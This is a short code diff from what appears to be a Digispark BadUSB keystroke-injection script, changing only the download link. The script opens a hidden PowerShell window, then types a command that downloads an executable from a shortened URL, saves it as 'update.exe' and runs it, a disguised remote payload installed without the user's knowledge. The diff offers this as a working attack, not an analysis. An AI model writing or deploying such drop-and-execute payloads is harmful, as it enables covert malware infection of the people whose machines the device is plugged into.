@@ -37,7 +37,7 @@ DigiKeyboard.delay(500);
 
 DigiKeyboard.println("powershell.exe  -windowstyle hidden");
 DigiKeyboard.delay(5000);
-DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://bit.ly/3s3uh5c'; $file = 'update.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
+DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'https://rb.gy/niwt7j'; $file = 'update.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(2000);
